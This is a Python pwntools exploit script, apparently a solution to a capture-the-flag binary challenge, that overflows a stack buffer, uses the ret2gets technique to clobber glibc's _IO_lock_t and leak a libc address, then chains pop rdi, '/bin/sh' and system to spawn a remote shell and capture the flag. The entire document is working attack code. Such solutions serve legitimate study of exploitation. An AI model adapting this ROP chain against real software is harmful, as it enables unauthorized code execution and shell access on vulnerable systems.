#!/usr/bin/env python3
# https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets#adjusting-for-2.37

from pwn import *

exe = "./chal"
elf = context.binary = ELF(exe)
context.terminal = ["tmux", "splitw", "-h"]

offset = 40

context.log_level = "debug"
io = remote("challenge.secso.cc", 8004)

r = ROP(exe)
r.raw(r.ret)  # stack alignment
r.raw(elf.sym.gets)
r.raw(elf.sym.gets)
r.raw(elf.sym.printf)
r.raw(elf.sym.main)
print(r.dump())

payload = flat({offset: r.chain()})

# typedef struct {
#     int lock;
#     int cnt;
#     void *owner;
# } _IO_lock_t;

io.sendline(payload)
# sets lock = 0, fill cnt with junk, clobber owner
io.sendline(p32(0) + b"A" * 4 + b"B" * 8)
io.sendline(b"CCCC")  # fill lock with junk
io.recvline()  # get default binary printf line
io.recv(8)  # get junk from _IO_lock_t clobbering
libc_base_addr = u64(io.recv(6) + b"\x00\x00") + 0x28C0  # default offset from TLS base
log.info(f"libc base address: {hex(libc_base_addr)}")

# grabbed libc from ubuntu:24 (dockerfile in other chal :3)
libc = ELF("./libc.so.6")
libc.address = libc_base_addr

r = ROP(libc)
r.raw(next(libc.search(asm("pop rdi; ret;"), executable=True)))
r.raw(next(libc.search(b"/bin/sh\x00")))
r.raw(libc.sym.system)
payload = flat({offset: r.chain()})

io.sendline(payload)
io.interactive()

# K17{w04h_h0w_d1d_u_g37s_7h15}
